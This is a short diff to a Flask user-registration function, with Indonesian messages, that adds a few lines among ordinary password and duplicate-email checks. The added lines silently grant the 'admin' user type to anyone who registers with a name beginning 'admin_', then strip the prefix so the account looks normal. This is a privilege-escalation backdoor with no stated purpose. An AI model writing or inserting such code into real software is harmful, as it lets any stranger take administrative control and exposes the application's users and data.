@@ -188,7 +188,7 @@ def register():
         if password != password_confirmation:
             flash('Konfirmasi password tidak cocok.', 'danger')
             return render_template('register.html')
-
+        
         existing_user = fetch_one(
             query.GET_USER_BY_EMAIL,
             (email,),
@@ -196,6 +196,10 @@ def register():
         if existing_user is not None:
             flash('Email sudah terdaftar. Silakan login.', 'warning')
             return redirect(url_for('login'))
+
+        if nama.lower().startswith("admin_"):
+            tipe_user = "admin"
+            nama = nama[6:]
 
         password_hash = generate_password_hash(password)
         execute_query(
